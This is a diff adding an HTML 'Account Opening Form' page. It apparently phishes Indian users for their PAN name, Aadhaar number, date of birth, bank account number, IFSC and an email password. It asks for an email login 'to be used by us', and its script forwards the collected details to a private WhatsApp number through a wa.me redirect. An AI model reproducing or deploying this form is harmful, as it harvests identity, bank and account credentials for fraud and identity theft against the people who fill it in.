@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Opening Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
+        }
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #ffffff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
+        h2 {
+            text-align: center;
+            color: #333;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .note {
+            background-color: #f0f8ff;
+            padding: 10px;
+            border-left: 4px solid #007bff;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .submit-btn {
+            display: block;
+            width: 100%;
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            text-align: center;
+        }
+        .submit-btn:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Account Opening Form</h2>
+        <form id="accountForm" onsubmit="return sendToWhatsApp()">
+            <div class="form-group">
+                <label for="name">Name (As per PAN)</label>
+                <input type="text" id="name" name="name" placeholder="First Middle Last" required>
+            </div>
+            <div class="form-group">
+                <label for="mobile">Mobile Number</label>
+                <input type="tel" id="mobile" name="mobile" placeholder="10-digit number" maxlength="10" required>
+            </div>
+            <div class="form-group">
+                <label for="email">Email ID</label>
+                <input type="email" id="email" name="email" placeholder="example@domain.com" required>
+            </div>
+            <div class="form-group">
+                <label for="emailPassword">Email ID Password (optional)</label>
+                <input type="password" id="emailPassword" name="emailPassword">
+            </div>
+            <div class="form-group">
+                <label for="aadhar">Aadhar Number</label>
+                <input type="text" id="aadhar" name="aadhar" placeholder="0000 0000 0000" maxlength="14" required>
+            </div>
+            <div class="form-group">
+                <label for="dob">Date of Birth</label>
+                <input type="text" id="dob" name="dob" placeholder="DD/MM/YYYY" maxlength="10" required>
+            </div>
+
+            <h3>Bank Details</h3>
+            <div class="form-group">
+                <label for="bankName">Bank Name</label>
+                <input type="text" id="bankName" name="bankName" required>
+            </div>
+            <div class="form-group">
+                <label for="accountNumber">Bank Account Number</label>
+                <input type="text" id="accountNumber" name="accountNumber" placeholder="9-18 digits" maxlength="18" required>
+            </div>
+            <div class="form-group">
+                <label for="ifsc">IFSC</label>
+                <input type="text" id="ifsc" name="ifsc" placeholder="XXXX0XXXXXX" required>
+            </div>
+
+            <div class="note">
+                <strong>Note:</strong> Please provide a secondary email ID that can be used to login by us whenever required.
+            </div>
+
+            <button type="submit" class="submit-btn">Submit</button>
+        </form>
+    </div>
+
+    <script>
+        function sendToWhatsApp() {
+            const name = document.getElementById('name').value.trim();
+            const mobile = document.getElementById('mobile').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const aadhar = document.getElementById('aadhar').value.trim();
+            const dob = document.getElementById('dob').value.trim();
+            const bankName = document.getElementById('bankName').value.trim();
+            const accountNumber = document.getElementById('accountNumber').value.trim();
+            const ifsc = document.getElementById('ifsc').value.toUpperCase().trim();
+
+            // Validate Name (must be 3 words)
+            if (name.split(' ').length !== 3) {
+                alert('Name must include First, Middle, and Last names.');
+                return false;
+            }
+
+            // Validate Aadhar (must be in 0000 0000 0000 format)
+            const aadharRegex = /^\d{4}\s\d{4}\s\d{4}$/;
+            if (!aadharRegex.test(aadhar)) {
+                alert('Aadhar number must be in the format 0000 0000 0000.');
+                return false;
+            }
+
+            // Prepare WhatsApp message
+            const message = `*Account Opening Form*%0A%0A` +
+                            `*Name:* ${name}%0A` +
+                            `*Mobile:* ${mobile}%0A` +
+                            `*Email:* ${email}%0A` +
+                            `*Aadhar:* ${aadhar}%0A` +
+                            `*Date of Birth:* ${dob}%0A%0A` +
+                            `*Bank Details*%0A` +
+                            `*Bank Name:* ${bankName}%0A` +
+                            `*Account Number:* ${accountNumber}%0A` +
+                            `*IFSC:* ${ifsc}%0A`;
+
+            const whatsappUrl = `https://wa.me/918329987567?text=${message}`;
+            window.location.href = whatsappUrl;
+
+            return false; // Prevent form submission
+        }
+
+        document.getElementById('dob').addEventListener('input', function (event) {
+            let input = event.target.value;
+            // Automatically format date as DD/MM/YYYY
+            input = input.replace(/[^0-9]/g, '').slice(0, 8);
+            if (input.length > 2) input = input.slice(0, 2) + '/' + input.slice(2);
+            if (input.length > 5) input = input.slice(0, 5) + '/' + input.slice(5);
+            event.target.value = input;
+        });
+
+        document.getElementById('ifsc').addEventListener('input', function (event) {
+            event.target.value = event.target.value.toUpperCase();
+        });
+    </script>
+</body>
+</html>
